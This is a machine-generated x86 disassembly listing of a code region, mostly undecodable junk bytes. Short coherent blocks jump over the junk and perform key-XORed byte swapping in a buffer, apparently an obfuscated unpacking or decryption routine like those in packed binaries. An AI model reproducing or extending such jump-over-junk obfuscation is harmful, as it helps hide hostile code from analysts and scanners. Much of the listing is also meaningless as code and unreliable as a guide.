  408495:	imul   esi,DWORD PTR [esi+0x4264e83e],0xf3d3c691
  40849f:	popf   
  4084a0:	imul   esi,DWORD PTR [edi-0x2e],0xffffffdc
  4084a4:	cmp    BYTE PTR [edx],dl
  4084a6:	fdiv   QWORD PTR [edx-0x73eef00a]
  4084ac:	and    eax,0xcd5bb401
  4084b1:	or     eax,0x93405c38
  4084b6:	and    esi,esp
  4084b8:	in     eax,dx
  4084b9:	sbb    eax,DWORD PTR [ebx+0x2e]
  4084bc:	dec    esi
  4084bd:	ret    0xffd9
  4084c0:	push   0xa3cd7231
  4084c5:	les    esp,FWORD PTR [ebx-0x73]
  4084c8:	enter  0xc0db,0xce
  4084cc:	arpl   sp,bx
  4084ce:	(bad)  
  4084cf:	ja     0x40846b
  4084d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d2:	jmp    0x3456:0xf90bca03
  4084d9:	add    BYTE PTR [ebx+eax*1+0x2c],ch
  4084dd:	push   0xfffbe118
  4084e2:	push   eax
  4084e3:	mov    al,ds:0x3a65c8c6
  4084e8:	leave  
  4084e9:	xor    eax,DWORD PTR [esi]
  4084eb:	leave  
  4084ec:	mov    al,0x44
  4084ee:	sti    
  4084ef:	xor    eax,0x472393c0
  4084f4:	(bad)  
  4084f5:	adc    ecx,DWORD PTR [ecx]
  4084f7:	push   ebp
  4084f8:	mov    WORD PTR [ebp+edx*4+0x44bf6617],cs
  4084ff:	scas   eax,DWORD PTR es:[edi]
  408500:	(bad)  
  408501:	js     0x408540
  408503:	push   cs
  408504:	mov    ch,0xdc
  408506:	inc    esp
  408507:	inc    esi
  408508:	bound  edx,QWORD PTR [ecx+0x435ebbe1]
  40850e:	shl    bh,0x92
  408511:	scas   al,BYTE PTR es:[edi]
  408512:	out    0x8c,al
  408514:	shr    BYTE PTR [esi-0x582e45d1],cl
  40851a:	sti    
  40851b:	adc    cl,ch
  40851d:	retf   0x56f8
  408520:	cmp    bl,BYTE PTR [ecx]
  408522:	xor    BYTE PTR [edi-0x790bcdde],0x4
  408529:	test   DWORD PTR [edx-0x68],eax
  40852c:	jecxz  0x4084dc
  40852e:	pop    esp
  40852f:	sbb    eax,0x804a245
  408534:	sar    bh,0x34
  408537:	idiv   DWORD PTR [edx-0x9]
  40853a:	in     eax,dx
  40853b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40853c:	push   ss
  40853d:	test   BYTE PTR [esi],ch
  40853f:	xchg   BYTE PTR [eax+esi*1],cl
  408542:	xchg   esp,eax
  408543:	scas   al,BYTE PTR es:[edi]
  408544:	fwait
  408545:	mov    ch,0xd3
  408547:	inc    edx
  408548:	xor    ebx,DWORD PTR [ecx]
  40854a:	rcl    DWORD PTR [edx+0x71dc8c53],cl
  408550:	sub    ch,BYTE PTR [edi+0x1994abfa]
  408556:	jb     0x408516
  408558:	popf   
  408559:	cmp    al,0xe4
  40855b:	inc    esi
  40855c:	arpl   dx,si
  40855e:	cmc    
  40855f:	jno    0x408573
  408561:	out    dx,eax
  408562:	call   0x3c7c4348
  408567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408568:	mov    bl,0x4a
  40856a:	neg    DWORD PTR [edi]
  40856c:	and    ebx,DWORD PTR [edi]
  40856e:	and    al,0x29
  408570:	mov    dh,0xd5
  408572:	or     DWORD PTR [ecx],0xfffffff0
  408575:	mov    ch,0x32
  408577:	loopne 0x4085e6
  408579:	add    ch,BYTE PTR [esi+0x4b]
  40857c:	and    ch,0x3f
  40857f:	inc    ebx
  408580:	sbb    ebx,DWORD PTR [edx]
  408582:	(bad)  
  408583:	and    al,BYTE PTR [ecx+0x19]
  408586:	out    0x9e,eax
  408588:	cmp    ebx,edx
  40858a:	ja     0x408598
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x2b05353f
  4085c4:	mov    ds:0x7ed7e17a,eax
  4085c9:	jle    0x408555
  4085cb:	jg     0x40864b
  4085cd:	jle    0x4085bb
  4085cf:	sub    bh,BYTE PTR [esi-0x1c]
  4085d2:	imul   ebp,DWORD PTR [edi-0x2b],0xffffffdb
  4085d6:	mov    bl,0x71
  4085d8:	test   BYTE PTR [ebx+edx*8+0x5a],dl
  4085dc:	cmp    al,0x66
  4085de:	sar    DWORD PTR [ebx-0x3],0xc9
  4085e2:	clc    
  4085e3:	cwde   
  4085e4:	adc    BYTE PTR [eax+0x398a1da9],0x11
  4085eb:	retf   
  4085ec:	xchg   edi,eax
  4085ed:	popa   
  4085ee:	add    eax,0x9d954e53
  4085f3:	xor    eax,esi
  4085f5:	in     al,0xc5
  4085f7:	icebp  
  4085f8:	jmp    0xd8a095b6
  4085fd:	mov    ds:0x6e4c53b8,eax
  408602:	jp     0x408664
  408604:	call   FWORD PTR [edx+0x2e]
  408607:	xor    al,0x30
  408609:	daa    
  40860a:	test   al,0xd5
  40860c:	mov    ds:0xf2b0e8f6,al
  408611:	add    al,0x26
  408613:	cdq    
  408614:	push   edx
  408615:	fldenv [esi+0x7e]
  408618:	mov    bh,bh
  40861a:	cmp    dh,bl
  40861c:	sub    al,0x25
  40861e:	inc    ecx
  40861f:	sub    eax,0xfc119843
  408624:	dec    edi
  408625:	push   esp
  408626:	pop    edi
  408627:	adc    DWORD PTR [ebx-0x40],esp
  40862a:	mov    ds:0x814fc53b,eax
  40862f:	daa    
  408630:	push   ecx
  408631:	fwait
  408632:	pop    esp
  408633:	xor    al,0x40
  408635:	lock xor al,0xa8
  408638:	ja     0x408691
  40863a:	ins    BYTE PTR es:[edi],dx
  40863b:	pop    ss
  40863c:	aam    0x95
  40863e:	outs   dx,BYTE PTR ds:[esi]
  40863f:	les    ebp,FWORD PTR [ecx-0x4c]
  408642:	mov    BYTE PTR [edx+0x7778acd1],bh
  408648:	jbe    0x40863e
  40864a:	(bad)  
  40864b:	sti    
  40864c:	mov    bh,0xb5
  40864e:	push   0xa80ffc3d
  408653:	push   edi
  408654:	test   al,0x34
  408656:	mov    ecx,0x21e66329
  40865b:	daa    
  40865c:	jbe    0x408680
  40865e:	xor    al,0xac
  408660:	dec    edx
  408661:	lds    ecx,FWORD PTR [edx+edi*8+0x63]
  408665:	imul   ecx,DWORD PTR ds:0x66248ce1,0x4400730a
  40866f:	xchg   DWORD PTR [edi-0x70],esp
  408672:	out    0x57,eax
  408674:	cdq    
  408675:	call   0x24c2a9a4
  40867a:	div    DWORD PTR [ecx]
  40867c:	xor    BYTE PTR [esi],cl
  40867e:	fcom   QWORD PTR [edx-0x1b044cc5]
  408684:	push   eax
  408685:	push   ecx
  408686:	jns    0x408628
  408688:	mov    WORD PTR [ebx],fs
  40868a:	jmp    0x7435:0x37bb7442
  408691:	hlt    
  408692:	into   
  408693:	mov    eax,0x5527ca35
  408698:	mov    ds:0x1e970ca2,eax
  40869d:	jmp    0x5370:0xdde8d4bc
  4086a4:	jb     0x408709
  4086a6:	loop   0x408687
  4086a8:	add    al,0x5f
  4086aa:	aas    
  4086ab:	nop
  4086ac:	cmp    al,0xd2
  4086ae:	aam    0x83
  4086b0:	ficom  DWORD PTR [ecx]
  4086b2:	inc    eax
  4086b3:	bound  esp,QWORD PTR [edi]
  4086b5:	scas   eax,DWORD PTR es:[edi]
  4086b6:	inc    ebp
  4086b7:	in     eax,0x21
  4086b9:	lods   al,BYTE PTR ds:[esi]
  4086ba:	add    eax,0xd5f85088
  4086bf:	mov    DWORD PTR gs:0x490d4ca1,eax
  4086c6:	ret    0xead5
  4086c9:	iret   
  4086ca:	out    0x7c,al
  4086cc:	mov    eax,ds:0x73eca49d
  4086d1:	xchg   ebx,eax
  4086d2:	mov    dh,0x44
  4086d4:	push   ecx
  4086d5:	push   ebx
  4086d6:	lods   al,BYTE PTR ds:[esi]
  4086d7:	jecxz  0x408698
  4086d9:	nop
  4086da:	mov    dh,0x39
  4086dc:	imul   ebp,ecx,0x49
  4086df:	cmp    al,0xf4
  4086e1:	sbb    ebp,esi
  4086e3:	jb     0x4086bf
  4086e5:	xchg   esi,eax
  4086e6:	leave  
  4086e7:	not    BYTE PTR [ebx-0x4848acaf]
  4086ed:	jnp    0x408704
  4086ef:	js     0x40871a
  4086f1:	shl    BYTE PTR [edi],1
  4086f3:	sub    al,0x33
  4086f5:	mov    ch,0x8
  4086f7:	pushf  
  4086f8:	scas   al,BYTE PTR es:[edi]
  4086f9:	cmp    eax,0xa5b4ae53
  4086fe:	in     al,0x17
  408700:	mov    eax,ds:0xbee574da
  408705:	inc    esp
  408706:	je     0x408753
  408708:	ds mov edi,0x68723c7f
  40870e:	xchg   ebx,eax
  40870f:	jb     0x40877d
  408711:	in     al,0x86
  408713:	mov    esp,0x26c10d1f
  408718:	aaa    
  408719:	push   edx
  40871a:	(bad)  
  40871b:	neg    BYTE PTR [ecx+0x28]
  40871e:	ds inc esp
  408720:	dec    ebx
  408721:	inc    edx
  408722:	cld    
  408723:	test   BYTE PTR [ecx],ah
  408725:	pop    ds
  408726:	pop    esi
  408727:	jbe    0x4086fb
  408729:	and    ebx,eax
  40872b:	mov    bh,BYTE PTR [ebp-0x345003f]
  408731:	test   eax,0x5740f38f
  408736:	add    al,BYTE PTR [ecx]
  408738:	cmp    eax,0xdc366b1e
  40873d:	mov    al,0x14
  40873f:	push   ss
  408740:	or     al,0x39
  408742:	(bad)  [edx]
  408744:	jp     0x408749
  408746:	add    esp,edx
  408748:	ss mov eax,0x3611238b
  40874e:	cld    
  40874f:	test   DWORD PTR [ecx-0x72],edi
  408752:	pusha  
  408753:	xor    ax,0xa8e
  408757:	sbb    DWORD PTR [ebx],ecx
  408759:	xchg   ecx,eax
  40875a:	xchg   ebx,eax
  40875b:	sub    DWORD PTR ds:0x6d69d74e,ecx
  408761:	pop    edx
  408762:	cmp    ebx,edx
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	push   es
  408848:	nop
  408849:	mov    eax,0x7ed57d90
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x40886f
  408854:	sub    al,0xdb
  408856:	nop
  408857:	xor    DWORD PTR [eax],edx
  408859:	xchg   BYTE PTR [ecx-0x1e],ah
  40885c:	jmp    0x2c81:0x607c8fd3
  408863:	lds    ebx,FWORD PTR [eax]
  408865:	in     al,dx
  408866:	jnp    0x408818
  408868:	loope  0x4087f6
  40886a:	in     al,0x40
  40886c:	xor    eax,0x5d9d39db
  408871:	cmp    DWORD PTR [eax],esi
  408873:	lea    edi,[edx+eax*8+0x40]
  408877:	inc    edi
  408878:	jnp    0x40887f
  40887a:	inc    ebx
  40887b:	mov    esp,0x8f4a89e2
  408880:	dec    edi
  408881:	int3   
  408882:	test   bl,0xb9
  408885:	or     ah,BYTE PTR [eax-0x46]
  408888:	dec    esi
  408889:	jns    0x4088d0
  40888b:	jecxz  0x408838
  40888d:	das    
  40888e:	mov    bh,0xa5
  408890:	cdq    
  408891:	shl    BYTE PTR [esi+0x4d],0xff
  408895:	std    
  408896:	aaa    
  408897:	out    dx,al
  408898:	aaa    
  408899:	int3   
  40889a:	ins    BYTE PTR es:[edi],dx
  40889b:	push   cs
  40889c:	mov    ah,0x26
  40889e:	call   0xd05:0x2bb5a57a
  4088a5:	(bad)  
  4088a6:	xor    DWORD PTR [esi+0x7b],edx
  4088a9:	mov    eax,0x347a5027
  4088ae:	fisttp DWORD PTR [esi-0x29e4cf2d]
  4088b4:	cmovnp edi,edi
  4088b7:	retf   0x4a4
  4088ba:	into   
  4088bb:	aad    0x3f
  4088bd:	lock push esi
  4088bf:	fs in  al,dx
  4088c1:	push   ss
  4088c2:	jmp    0x26cf:0xf4ea11b8
  4088c9:	push   ecx
  4088ca:	fwait
  4088cb:	xor    bl,cl
  4088cd:	into   
  4088ce:	pop    edi
  4088cf:	jg     0x408895
  4088d1:	push   ecx
  4088d2:	cs push ss
  4088d4:	mov    eax,0xe7d18bca
  4088d9:	mov    eax,0x21e7d27
  4088de:	sub    al,0x9c
  4088e0:	ins    DWORD PTR es:[edi],dx
  4088e1:	inc    ebp
  4088e2:	jecxz  0x4088a2
  4088e4:	push   edx
  4088e5:	aaa    
  4088e6:	cwde   
  4088e7:	sbb    ebx,edi
  4088e9:	mov    edx,0xc9f172f0
  4088ee:	cli    
  4088ef:	lahf   
  4088f0:	sti    
  4088f1:	daa    
  4088f2:	imul   ebx,esp,0x51d76f43
  4088f8:	test   al,0xc3
  4088fa:	aam    0x1c
  4088fc:	lahf   
  4088fd:	sar    BYTE PTR [ebx-0x75],1
  408900:	push   esi
  408901:	loopne 0x408949
  408903:	adc    ch,BYTE PTR ss:[edi+0x3]
  408907:	call   0xd47aaa98
  40890c:	fcomp  QWORD PTR [edx]
  40890e:	lds    edi,FWORD PTR [esi-0x434916d8]
  408914:	inc    esp
  408915:	out    0x83,eax
  408917:	add    ah,BYTE PTR [ebx]
  408919:	sbb    eax,0x42d57790
  40891e:	pop    ecx
  40891f:	mov    ebx,DWORD PTR [ecx-0x128b3c1f]
  408925:	jae    0x408961
  408927:	xor    eax,0x8e42e56e
  40892c:	test   eax,0x3b72c7bc
  408931:	lds    eax,FWORD PTR [esi-0x1ac0be8f]
  408937:	jge    0x408900
  408939:	mov    ds:0x76aeae43,eax
  40893e:	sbb    eax,DWORD PTR [esi+ebp*4-0x64]
  408942:	das    
  408943:	mov    ecx,0x8352954e
  408948:	and    al,0x80
  40894b:	mov    esp,0xe69d527e
  408950:	lods   eax,DWORD PTR ds:[esi]
  408951:	and    al,0x59
  408953:	lock icebp 
  408955:	pop    ss
  408956:	or     eax,0x68bfc768
  40895b:	xlat   BYTE PTR ds:[ebx]
  40895c:	push   esp
  40895d:	push   ds
  40895e:	lahf   
  40895f:	arpl   WORD PTR [eax],si
  408961:	imul   edi,DWORD PTR [ebx-0x74],0xd370889d
  408968:	out    dx,al
  408969:	fcmovnb st,st(4)
  40896b:	pop    ecx
  40896c:	pop    ss
  40896d:	fs arpl cx,dx
  408970:	ret    0xce70
  408973:	in     eax,dx
  408974:	add    ch,BYTE PTR [edi+edi*1]
  408977:	repz or BYTE PTR [ebx+0x32],dh
  40897b:	adc    edi,DWORD PTR [ecx-0x15]
  40897e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40897f:	mov    ebx,0x5e0aae69
  408984:	(bad)  
  408985:	out    dx,eax
  408986:	enter  0xe5d3,0x87
  40898a:	mov    eax,0x31c58854
  40898f:	mov    ebx,DWORD PTR [edi+0x62ed8a46]
  408995:	leave  
  408996:	dec    ebp
  408997:	mov    ds:0x6f99d9f4,al
  40899c:	pop    edi
  40899d:	dec    edi
  40899e:	test   eax,0x96061172
  4089a3:	arpl   WORD PTR [ecx+0x77],di
  4089a6:	cmc    
  4089a7:	sbb    eax,0xdbd433da
  4089ac:	cld    
  4089ad:	popa   
  4089ae:	add    esp,DWORD PTR [ebx+0x19]
  4089b1:	arpl   WORD PTR [eax-0x7824f496],ax
  4089b7:	sbb    eax,0x9dad3017
  4089bc:	js     0x40894b
  4089be:	push   esp
  4089bf:	ds imul edi,edi,0xffffffbc
  4089c3:	mov    cl,0xf1
  4089c5:	enter  0x1b70,0xc
  4089c9:	fist   DWORD PTR [edi-0x31d980ef]
  4089cf:	push   cs
  4089d0:	inc    esi
  4089d1:	aam    0x3f
  4089d3:	test   BYTE PTR [ebp+0x26f102d6],dl
  4089d9:	lock sahf 
  4089db:	inc    ecx
  4089dc:	push   cs
  4089dd:	push   0xfffffff6
  4089df:	push   eax
  4089e0:	jnp    0x408a4d
  4089e2:	mov    gs,ebp
  4089e4:	shl    DWORD PTR [ebx+edi*8+0x33],0xf8
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	aam    0x58
  408a08:	push   es
  408a09:	cld    
  408a0a:	mov    edx,edx
  408a0c:	jle    0x408a8c
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x408a5b
  408a13:	aam    0x65
  408a15:	jecxz  0x4089a9
  408a17:	iret   
  408a18:	and    eax,0xffffffbe
  408a1b:	jae    0x408a02
  408a1d:	or     eax,0xee4a36a4
  408a22:	adc    BYTE PTR [eax],0x7e
  408a25:	mov    edx,0xef4228b0
  408a2a:	pop    edi
  408a2b:	sbb    DWORD PTR [edx],esp
  408a2d:	out    dx,al
  408a2e:	shl    BYTE PTR [edi+0x507497cc],0xa
  408a35:	shl    DWORD PTR [ecx+0x5da84a39],0xd7
  408a3c:	(bad)  
  408a3d:	fsub   st,st(4)
  408a3f:	retf   0xfd34
  408a42:	shl    BYTE PTR [ecx+0x2b0119b5],cl
  408a48:	xchg   ecx,eax
  408a49:	mov    al,0x9c
  408a4b:	(bad)  
  408a4c:	ins    BYTE PTR es:[edi],dx
  408a4d:	and    ah,cl
  408a4f:	imul   edi,DWORD PTR [esi+edx*2+0x234a89f2],0xffffff92
  408a57:	outs   dx,DWORD PTR ds:[esi]
  408a58:	nop
  408a59:	pop    ebp
  408a5a:	and    ecx,DWORD PTR [ecx]
  408a5c:	jle    0x408aa5
  408a5e:	std    
  408a5f:	jns    0x408ab0
  408a61:	sbb    DWORD PTR [ecx+0x60],ebx
  408a64:	addr16 rcr esi,cl
  408a67:	inc    edi
  408a68:	jne    0x408a5d
  408a6a:	shl    ch,1
  408a6c:	lods   eax,DWORD PTR ds:[esi]
  408a6d:	pop    edi
  408a6e:	xchg   esp,eax
  408a6f:	cmp    BYTE PTR [ebp+0x7e],al
  408a72:	add    ah,BYTE PTR [eax+0x7044b57a]
  408a78:	inc    edx
  408a79:	xlat   BYTE PTR ds:[ebx]
  408a7a:	psllq  mm0,QWORD PTR [eax+0x3deaa94b]
  408a81:	je     0x408aeb
  408a83:	adc    bh,BYTE PTR gs:[ebx-0x7c78065d]
  408a8a:	adc    BYTE PTR [ebx],0x21
  408a8d:	cmp    esi,DWORD PTR [ebx-0x39]
  408a90:	or     BYTE PTR [esi],cl
  408a92:	add    al,0x4b
  408a94:	mov    al,ds:0xb51b7750
  408a99:	mov    ch,BYTE PTR cs:[ecx]
  408a9c:	(bad)  
  408a9d:	jmp    0xd79035ea
  408aa2:	mov    ch,0x10
  408aa4:	jge    0x408a9f
  408aa6:	mov    cl,0x9d
  408aa8:	ret    0x1ef1
  408aab:	es jl  0x408aed
  408aae:	outs   dx,DWORD PTR ds:[esi]
  408aaf:	les    edx,FWORD PTR [ecx]
  408ab1:	adc    eax,ebp
  408ab3:	inc    ebp
  408ab4:	inc    eax
  408ab5:	jmp    0x408b05
  408ab7:	(bad)  
  408ab8:	mov    edi,0x3979679e
  408abd:	jbe    0x408a4d
  408abf:	mov    WORD PTR [edi],fs
  408ac1:	and    ah,al
  408ac3:	ja     0x408aac
  408ac5:	inc    ecx
  408ac6:	mov    ch,0x3
  408ac8:	int3   
  408ac9:	lods   al,BYTE PTR ds:[esi]
  408aca:	fistp  DWORD PTR [ecx+0x1e321547]
  408ad0:	das    
  408ad1:	mov    cl,0xf8
  408ad3:	sbb    eax,0x486e8489
  408ad8:	cmp    eax,0xcd4df0b3
  408ade:	and    DWORD PTR [ecx+0x5ebbcba8],0xfffffff9
  408ae5:	fs hlt 
  408ae7:	cmp    eax,0xdd303b49
  408aec:	stos   DWORD PTR es:[edi],eax
  408aed:	fs xchg ecx,eax
  408aef:	mov    esp,0xdf524272
  408af4:	sub    dh,BYTE PTR [edx]
  408af6:	cdq    
  408af7:	inc    edx
  408af8:	and    al,BYTE PTR [ecx]
  408afa:	pop    ds
  408afb:	enter  0x7052,0xb1
  408aff:	mov    DWORD PTR [esi*4-0x2d473e8f],ecx
  408b06:	add    ch,bl
  408b08:	sbb    eax,DWORD PTR [ebx]
  408b0a:	cmp    DWORD PTR [edx],edi
  408b0c:	mov    DWORD PTR [ebx],esi
  408b0e:	mov    al,0x90
  408b10:	out    dx,al
  408b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b12:	test   eax,0x933039bf
  408b17:	sbb    DWORD PTR [ebx],0xffffff98
  408b1a:	sahf   
  408b1b:	call   0x29434450
  408b20:	mul    DWORD PTR [ecx]
  408b22:	xchg   DWORD PTR [edi+0x1026a7b9],edi
  408b28:	xchg   ebx,eax
  408b29:	or     BYTE PTR [ebp+0x69],0x2d
  408b2d:	loopne 0x408b47
  408b2f:	push   edi
  408b30:	cmp    dl,BYTE PTR [edx]
  408b32:	hlt    
  408b33:	jle    0x408ad0
  408b35:	and    al,0xa7
  408b37:	xor    DWORD PTR [ebp-0x43504202],eax
  408b3d:	retf   
  408b3e:	les    esi,FWORD PTR [eax+eax*1+0x35]
  408b42:	jbe    0x408b20
  408b44:	xor    al,0xe2
  408b46:	xor    al,0xb2
  408b48:	jle    0x408ba8
  408b4a:	adc    ah,BYTE PTR [ebx-0x41]
  408b4d:	nop
  408b4e:	fmul   DWORD PTR [esi-0x72087568]
  408b54:	add    bl,ch
  408b56:	jp     0x408b97
  408b58:	adc    al,0x9e
  408b5a:	push   cs
  408b5b:	inc    ebx
  408b5c:	mov    al,ds:0xb75ef93b
  408b61:	(bad)  
  408b62:	daa    
  408b63:	push   edx
  408b64:	stc    
  408b65:	adc    edi,DWORD PTR [edx]
  408b67:	xchg   esi,eax
  408b68:	int3   
  408b69:	or     al,0xbc
  408b6b:	lock iret 
  408b6d:	jle    0x408b28
  408b6f:	outs   dx,DWORD PTR ds:[esi]
  408b70:	pushf  
  408b71:	xor    al,0x2
  408b73:	adc    al,dh
  408b75:	push   edi
  408b76:	xchg   edi,eax
  408b77:	sub    al,0x67
  408b79:	arpl   WORD PTR [edx+ecx*4+0x3d],dx
  408b7d:	xlat   BYTE PTR ds:[ebx]
  408b7e:	clc    
  408b7f:	jle    0x408b49
  408b81:	pop    edx
  408b82:	and    BYTE PTR [edi],bh
  408b84:	mov    eax,0x5bdeee34
  408b89:	fsub   QWORD PTR [ebx]
  408b8b:	sbb    BYTE PTR [ebp-0x4b3c02da],0xd0
  408b92:	mov    bl,0x8f
  408b94:	push   ds
  408b95:	mov    dh,0x2c
  408b97:	sahf   
  408b98:	popa   
  408b99:	das    
  408b9a:	mov    edi,0x4e8b270b
  408b9f:	les    ebp,FWORD PTR [eax]
  408ba1:	jle    0x408b75
  408ba3:	daa    
  408ba4:	inc    eax
  408ba5:	hlt    
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	rol    BYTE PTR [esi+0xe],1
  408bdb:	dec    ebx
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408c24
  408be5:	push   ds
  408be6:	adc    DWORD PTR [esp+ebx*8-0x765caa7b],esp
  408bed:	ins    BYTE PTR es:[edi],dx
  408bee:	mov    ds:0x46821e33,al
  408bf3:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf5:	(bad)  
  408bf6:	pop    edx
  408bf7:	inc    esp
  408bf8:	test   eax,0xa7ad79ac
  408bfd:	xor    al,0x11
  408bff:	js     0x408b82
  408c01:	(bad)  
  408c02:	sub    DWORD PTR [edi-0x202038b1],eax
  408c08:	dec    esi
  408c09:	fwait
  408c0a:	in     al,0x17
  408c0c:	adc    eax,0xb88ccd9e
  408c11:	xchg   ecx,eax
  408c12:	push   edi
  408c13:	or     eax,esi
  408c15:	push   esp
  408c16:	jl     0x408c28
  408c18:	push   ss
  408c19:	pop    ds
  408c1a:	shr    BYTE PTR [eax],cl
  408c1c:	mov    ecx,0x15e3da5e
  408c21:	dec    esp
  408c22:	jmp    0x408c29
  408c24:	push   edx
  408c25:	daa    
  408c26:	pop    es
  408c27:	test   BYTE PTR [ebp+0x60d8e2bf],dh
  408c2d:	mov    eax,0x58b02d58
  408c32:	pop    esp
  408c33:	and    edx,ebx
  408c35:	xor    eax,0x14c37ca2
  408c3a:	call   0x1a270d27
  408c3f:	stos   DWORD PTR es:[edi],eax
  408c40:	add    dl,bl
  408c42:	mov    cl,0x52
  408c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c45:	xchg   ebx,eax
  408c46:	je     0x408c64
  408c48:	fstp   QWORD PTR ds:[edi+0x25]
  408c4c:	inc    edi
  408c4d:	dec    BYTE PTR [ecx+ecx*1+0x11]
  408c51:	mov    bh,0xe3
  408c53:	fsubr  st,st(5)
  408c55:	fucomip st,st(7)
  408c57:	xor    edi,DWORD PTR [ecx]
  408c59:	leave  
  408c5a:	cmc    
  408c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c5c:	rol    DWORD PTR [edx-0x31],cl
  408c5f:	cdq    
  408c60:	out    0xf2,eax
  408c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c63:	xchg   DWORD PTR cs:0x749205cf,ebx
  408c6a:	cmovo  ebp,DWORD PTR [ebp-0x1d88d4c9]
  408c71:	inc    esi
  408c72:	iret   
  408c73:	out    dx,eax
  408c74:	push   edx
  408c75:	(bad)  
  408c76:	retf   
  408c77:	scas   al,BYTE PTR es:[edi]
  408c78:	pop    ss
  408c79:	cmp    al,0xb8
